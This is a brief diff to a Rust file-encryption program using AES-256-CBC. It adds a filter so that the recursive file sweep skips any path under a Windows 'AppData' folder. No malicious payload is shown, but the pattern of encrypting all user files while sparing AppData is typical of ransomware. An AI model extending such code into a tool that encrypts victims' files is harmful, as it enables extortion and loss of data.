@@ -7,7 +7,7 @@ extern crate walkdir;
 use aes::Aes256;
 use block_modes::{BlockMode, Cbc};
 use block_modes::block_padding::Pkcs7;
-use walkdir::WalkDir;
+use walkdir::{WalkDir, DirEntry};
 use std::fs::File;
 use std::fs;
 use std::io::{Read, Write};
@@ -55,10 +55,16 @@ fn decrypt_file(input_path: &str, output_path: &str) -> Result<(), Box<dyn Error
     Ok(())
 }
 
+fn is_app_data(entry: &DirEntry) -> bool {
+    entry.path().components().any(|component| {
+        component.as_os_str() == "AppData"
+    })
+}
+
 fn get_all_files(dir: &str) -> Vec<String> {
     let mut file_paths = Vec::new();
     
-    for entry in WalkDir::new(dir).into_iter().filter_map(|e| e.ok()) {
+    for entry in WalkDir::new(dir).into_iter().filter_map(|e| e.ok()).filter(|e| !is_app_data(e)) {
         if entry.file_type().is_file() {
             file_paths.push(entry.path().display().to_string());
         }
